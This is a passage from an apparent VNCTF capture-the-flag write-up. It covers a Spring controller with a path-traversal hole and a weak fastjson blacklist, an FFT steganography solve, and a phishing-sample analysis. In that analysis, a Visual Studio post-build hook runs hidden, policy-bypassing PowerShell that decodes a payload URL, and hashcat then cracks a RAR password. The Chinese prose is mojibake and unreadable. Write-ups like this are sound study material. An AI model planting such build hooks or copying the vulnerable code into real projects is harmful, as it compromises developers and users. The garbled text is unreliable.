class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *@param img</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/searchimage&quot;, produces = MediaType.IMAGE_PNG_VALUE)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] t2(<span class="meta">@RequestParam</span> String img , Model model) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String path = img.trim();</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;/usr/local/springbootdemo/src/main/resources/static/images/&quot;</span>+img);</span><br><span class="line">        FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[inputStream.available()];</span><br><span class="line">        inputStream.read(bytes, <span class="number">0</span>, inputStream.available());</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @param roleJson</span></span><br><span class="line"><span class="comment">    * @return number roleText</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/create&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Sorcerer <span class="title">fast</span><span class="params">(<span class="meta">@RequestParam</span> String roleJson , Model model)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//System.out.println(roleJson);</span></span><br><span class="line">        <span class="comment">//blacklist</span></span><br><span class="line">        String check = roleJson.toLowerCase();</span><br><span class="line">       <span class="keyword">if</span> ( check.contains(<span class="string">&quot;com&quot;</span>) || check.contains(<span class="string">&quot;@&quot;</span>) || check.contains(<span class="string">&quot;type&quot;</span>) )&#123;</span><br><span class="line">            roleJson = <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;Hacker\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        JSONObject jsonObject = JSONObject.parseObject(roleJson);</span><br><span class="line">        String name = jsonObject.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        Sorcerer res = <span class="keyword">new</span> Sorcerer();</span><br><span class="line">        <span class="keyword">if</span>(name==<span class="keyword">null</span>)&#123;</span><br><span class="line">            name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Sorcerer  s = <span class="keyword">new</span> Sorcerer();</span><br><span class="line">        s.setName(name);</span><br><span class="line">        s.setNumber(name);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å†°å†°å¥½åƒè—ç€ç§˜å¯†"><a href="#å†°å†°å¥½åƒè—ç€ç§˜å¯†" class="headerlink" title="å†°å†°å¥½åƒè—ç€ç§˜å¯†"></a>å†°å†°å¥½åƒè—ç€ç§˜å¯†</h3><p>è§£å‹é™„ä»¶å¾—åˆ° FFT.png æ–‡ä»¶ï¼ˆå¯èƒ½æ˜¯ä¸‹å¾—å¤ªå¿«äº†ï¼Œä¸‹ä¸‹æ¥çš„æ—¶å€™æ˜¯ä¸ª zip æ–‡ä»¶ï¼Œè€Œä¸”æ²¡æœ‰æŸåã€‚ä½†æ˜¯å½“æ—¶çš„å›¾ç‰‡é‡Œæ²¡å¾— flagï¼Œæˆ‘è¿˜ä¸€åº¦ä»¥ä¸ºæˆ‘å‚…é‡Œå¶å˜æ¢åšé”™äº†ã€‚ç»“æœå¤ç°å‘ç°æ˜¯é™„ä»¶å˜æ¢è¿‡äº†ã€‚ï¼‰CyberChef ç›´æ¥å¯¹ RAR å‹ç¼©æ–‡æ¡£æå–æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615790828740/eb775a7a62b52860ef3f0a2f0a45565672fcbad8.png"></p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://hicraigchen.medium.com/digital-image-processing-using-fourier-transform-in-python-bcb49424fd82">https://hicraigchen.medium.com/digital-image-processing-using-fourier-transform-in-python-bcb49424fd82</a></p></blockquote><p>ä»ç½‘ä¸Šæ‰¾åˆ°çš„ç°æˆçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">6.4</span>*<span class="number">5</span>, <span class="number">3</span>*<span class="number">5</span>), constrained_layout=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">img_c1 = cv2.imread(<span class="string">&quot;extracted_at_0x47.png&quot;</span>, <span class="number">0</span>)</span><br><span class="line">img_c2 = np.fft.fft2(img_c1)</span><br><span class="line">img_c3 = np.fft.fftshift(img_c2)</span><br><span class="line">img_c4 = np.fft.ifftshift(img_c3)</span><br><span class="line">img_c5 = np.fft.ifft2(img_c4)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">151</span>), plt.imshow(img_c1, <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Original Image&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">152</span>), plt.imshow(np.log(<span class="number">1</span>+np.<span class="built_in">abs</span>(img_c2)), <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Spectrum&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">153</span>), plt.imshow(np.log(<span class="number">1</span>+np.<span class="built_in">abs</span>(img_c3)), <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Centered Spectrum&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">154</span>), plt.imshow(np.log(<span class="number">1</span>+np.<span class="built_in">abs</span>(img_c4)), <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Decentralized&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">155</span>), plt.imshow(np.<span class="built_in">abs</span>(img_c5), <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Processed Image&quot;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615791254518/ee875b6adc065398766439b5aa1505fef9812122.png"></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;Ff5_1S_bEauTiful&#125;</span><br></pre></td></tr></table></figure><h3 id="interesting-fishing"><a href="#interesting-fishing" class="headerlink" title="interesting_fishing"></a>interesting_fishing</h3><p>ä¸‹è½½é™„ä»¶åä½¿ç”¨ 010 editor æ‰“å¼€å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªé‚®ä»¶æ–‡ä»¶ï¼Œç»§è€Œå¯ä»¥æ‰¾åˆ°å…¶ä¸­ä¿å­˜çš„ base64 å½¢å¼çš„é™„ä»¶ã€‚å°†é™„ä»¶ä½¿ç”¨ CyberChef è§£ç å¹¶ä¿å­˜ä¸‹æ¥ï¼Œå¾—åˆ° myproject.rar æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615793051206/6feb265c4745c5cf9e28cc89ae332da9d585927f.png"></p><p>å°†å‹ç¼©æ–‡ä»¶è§£å‹å¯ä»¥å¾—åˆ°ä¸€ä¸ªé¡¹ç›®ï¼Œåœ¨å…¶ VS é…ç½®æ–‡ä»¶ä¸­å¯ä»¥å‘ç°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;PostBuildEvent&gt;</span><br><span class="line">&lt;Command&gt;powershell -exec bypass -w hi&quot;dd&quot;en -f x64\Debug\Browse.VC.db&lt;&#x2F;Command&gt;</span><br><span class="line">&lt;&#x2F;PostBuildEvent&gt;</span><br></pre></td></tr></table></figure><p>åœ¨å‹ç¼©æ–‡ä»¶ä¸­å¯¹åº”è·¯å¾„ä¸‹å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„ <code>Browse.VC.db</code> æ–‡ä»¶ï¼Œå¯ä»¥åœ¨å‹ç¼©æ–‡ä»¶ä¸­ç›´æ¥æ‰“å¼€ï¼Œå‘ç°å…¶ä¸­æœ‰å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$encodestring &#x3D; &quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;</span><br><span class="line">$bytes  &#x3D; [System.Convert]::FromBase64String($string);</span><br><span class="line">$decoded &#x3D; [System.Text.Encoding]::UTF8.GetString($bytes); </span><br><span class="line">echo $decoded</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ base64 è§£ç åå¯å¾—åˆ°æ ¼å¼ç±»ä¼¼äº <code>.u.-.6.5.4.3.2.?.</code> çš„æ•°æ®ï¼Œæ¨æµ‹å…¶æœ‰ç‚¹åƒ Unicode å­—ç¬¦ç¼–ç ï¼Œä½†æ˜¯å…¶ä¸ºè´Ÿæ•°ã€‚å†™ä¸ªè„šæœ¬å°†å…¶ä¸ 0xffff åšå·®å¾—åˆ°æ­£æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = [-<span class="number">65432</span>,-<span class="number">65420</span>,-<span class="number">65420</span>,-<span class="number">65424</span>,-<span class="number">65421</span>,-<span class="number">65478</span>,-<span class="number">65489</span>,-<span class="number">65489</span>,-<span class="number">65418</span>,-<span class="number">65426</span>,-<span class="number">65437</span>,-<span class="number">65420</span>,-<span class="number">65434</span>,-<span class="number">65491</span>,-<span class="number">65486</span>,-<span class="number">65487</span>,-<span class="number">65485</span>,-<span class="number">65491</span>,-<span class="number">65487</span>,-<span class="number">65486</span>,-<span class="number">65483</span>,-<span class="number">65481</span>,-<span class="number">65488</span>,-<span class="number">65482</span>,-<span class="number">65487</span>,-<span class="number">65487</span>,-<span class="number">65486</span>,-<span class="number">65485</span>,-<span class="number">65490</span>,-<span class="number">65437</span>,-<span class="number">65425</span>,-<span class="number">65421</span>,-<span class="number">65490</span>,-<span class="number">65439</span>,-<span class="number">65424</span>,-<span class="number">65491</span>,-<span class="number">65426</span>,-<span class="number">65439</span>,-<span class="number">65426</span>,-<span class="number">65430</span>,-<span class="number">65431</span>,-<span class="number">65426</span>,-<span class="number">65433</span>,-<span class="number">65490</span>,-<span class="number">65427</span>,-<span class="number">65415</span>,-<span class="number">65423</span>,-<span class="number">65437</span>,-<span class="number">65428</span>,-<span class="number">65425</span>,-<span class="number">65419</span>,-<span class="number">65436</span>,-<span class="number">65490</span>,-<span class="number">65437</span>,-<span class="number">65425</span>,-<span class="number">65427</span>,-<span class="number">65489</span>,-<span class="number">65456</span>,-<span class="number">65415</span>,-<span class="number">65425</span>,-<span class="number">65426</span>,-<span class="number">65433</span>,-<span class="number">65415</span>,-<span class="number">65439</span>,-<span class="number">65426</span>,-<span class="number">65433</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65421</span>,-<span class="number">65420</span>,-<span class="number">65425</span>,-<span class="number">65422</span>,-<span class="number">65435</span>,-<span class="number">65421</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65428</span>,-<span class="number">65425</span>,-<span class="number">65417</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65425</span>,-<span class="number">65426</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65434</span>,-<span class="number">65425</span>,-<span class="number">65422</span>,-<span class="number">65435</span>,-<span class="number">65431</span>,-<span class="number">65433</span>,-<span class="number">65426</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65433</span>,-<span class="number">65425</span>,-<span class="number">65425</span>,-<span class="number">65436</span>,-<span class="number">65421</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65439</span>,-<span class="number">65427</span>,-<span class="number">65431</span>,-<span class="number">65436</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65458</span>,-<span class="number">65425</span>,-<span class="number">65422</span>,-<span class="number">65420</span>,-<span class="number">65432</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65461</span>,-<span class="number">65425</span>,-<span class="number">65422</span>,-<span class="number">65435</span>,-<span class="number">65439</span>,-<span class="number">65426</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65469</span>,-<span class="number">65457</span>,-<span class="number">65450</span>,-<span class="number">65463</span>,-<span class="number">65468</span>,-<span class="number">65491</span>,-<span class="number">65487</span>,-<span class="number">65479</span>,-<span class="number">65499</span>,-<span class="number">65486</span>,-<span class="number">65488</span>,-<span class="number">65424</span>,-<span class="number">65439</span>,-<span class="number">65422</span>,-<span class="number">65439</span>,-<span class="number">65426</span>,-<span class="number">65425</span>,-<span class="number">65431</span>,-<span class="number">65439</span>,-<span class="number">65490</span>,-<span class="number">65422</span>,-<span class="number">65439</span>,-<span class="number">65422</span>];</span><br><span class="line"><span class="keyword">var</span> result = <span class="string">&quot;&quot;</span>; numbers.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">number</span>)</span>&#123; result += <span class="string">&quot;,&quot;</span> + (<span class="number">0xffff</span> + number + <span class="number">1</span>) &#125;);</span><br><span class="line">result;</span><br></pre></td></tr></table></figure><p>è§£ç åå¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com&#x2F;Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar</span><br></pre></td></tr></table></figure><p>å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°éœ€è¦è§£å‹å¯†ç ï¼ŒARCHPR çˆ†ç ´æ— æœä½†ç»™å‡ºçš„æç¤ºç¡®å®æ˜¯å››ä½æ•°å­—ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">maskcode</span><br><span class="line">The password is: four digits</span><br></pre></td></tr></table></figure><p>å› æ­¤å°è¯•ä½¿ç”¨ rar2john å…ˆå¾—åˆ°å¯†ç çš„ hashï¼Œå†ä½¿ç”¨ hashcat çˆ†ç ´ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lenovo@LAPTOP-3E49IU3M&gt;F:\..\..\..\..\run$.\rar2john <span class="string">&#x27;..\..\interesting_fishing\Pyongyang stores low on foreign goods amid North Korean COVID-19 paranoia.rar&#x27;</span></span><br><span class="line">..\..\interesting_fishing\Pyongyang stores low on foreign goods amid North Korean COVID-19 paranoia.rar:$rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15$ca4a3bc58278b04d9fba4d7d52acb196$8<span class="variable">$56245cd11e4a1c2e</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat64.exe -m 13000 -a 3 <span class="string">&#x27;$rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15$ca4a3bc58278b04d9fba4d7d52acb196$8$56245cd11e4a1c2e&#x27;</span> ?d?d?d?d</span><br><span class="line"></span><br><span class="line">$rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15$ca4a3bc58278b04d9fba4d7d52acb196$8<span class="variable">$56245cd11e4a1c2e</span>:9705</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: RAR5</span><br><span class="line">Hash.Target......: $rar5$16$1349cb834c70bf27bb4e48bb3fbe6975$15<span class="variable">$ca4a3b</span>...4a1c2e</span><br><span class="line">Time.Started.....: Mon Mar 15 18:10:13 2021 (2 secs)</span><br><span class="line">Time.Estimated...: Mon Mar 15 18:10:15 2021 (0 secs)</span><br><span class="line">Guess.Mask.......: ?d?d?d?d [4]</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#1.....:     2520 H/s (0.09ms) @ Accel:64 Loops:16 Thr:256 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 5000/10000 (50.00%)</span><br><span class="line">Rejected.........: 0/5000 (0.00%)</span><br><span class="line">Restore.Point....: 0/1000 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#1....: 9234 -&gt; 9764</span></span><br><span class="line">HWMon.Dev.<span class="comment">#1.....: Temp: 51c Util: 54% Core:1920MHz Mem:4001MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Mon Mar 15 18:09:57 2021</span><br><span class="line">Stopped: Mon Mar 15 18:10:16 2021 </span><br></pre></td></tr></table></figure><p>å¾ˆå¿«æ‹¿åˆ°äº†å‹ç¼©åŒ…çš„å¯†ç  9705ã€‚è§£å‹å‹ç¼©åŒ…å¾—åˆ°ä¸€ä¸ª Word æ–‡æ¡£ï¼Œå°† Word æ–‡æ¡£å†æ¬¡è§£åŒ…å¯å¾— hideinfo.xmlã€‚ä½¿ç”¨ 010 Editor å°†å…¶æ‰“å¼€å¯ä»¥å‘ç°ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615803400636/0d8b55b7447ad14d6f30637269fd0c6428474f38.png"></p><p>å°è¯•é›¶å®½å­—ç¬¦éšå†™å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615803606250/f653397825f5d9fa37a87330626698e49c6997bb.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹çš„ CyberChef receipe å¯¹ E-mail æ–‡ä»¶ä¸­çš„ base64 å­—ç¬¦ä¸²åšè¿›ä¸€æ­¥åˆ†æï¼Œå¯ä»¥å‘ç°æŸä¸€æ®µæ–‡æœ¬ä¸­å«æœ‰ä¸€ä¸ª img æ ‡ç­¾ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\n&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Base64(&#39;A-Za-z0-9+&#x2F;&#x3D;&#39;,true)</span><br><span class="line">Decode_text(&#39;Simplified Chinese GB18030 (54936)&#39;)</span><br><span class="line">From_HTML_Entity()</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com/ThisIsSecret.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 770px; height: 256px;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;img_insert_161259102178605354633598710636&quot;</span> <span class="attr">modifysize</span>=<span class="string">&quot;51%&quot;</span> <span class="attr">diffpixels</span>=<span class="string">&quot;8px&quot;</span> <span class="attr">scalingmode</span>=<span class="string">&quot;zoom&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨ OurSecret 